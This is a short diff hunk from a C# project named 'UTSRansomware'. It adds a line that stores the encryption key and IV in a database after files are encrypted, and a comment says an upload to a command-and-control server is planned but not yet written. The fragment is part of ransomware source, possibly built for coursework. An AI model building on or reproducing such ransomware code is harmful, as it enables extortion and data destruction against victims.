@@ -56,6 +56,7 @@ namespace UTSRansomware
              * After all encryption completed save the key and iv to text file
              * This is where the upload to a C2 should happen but I haven't implemented that yet
              */
+            SQLManager.AddComputerToDatabase(this.key, this.iv);
             SaveKeyAndIv();
         }
 
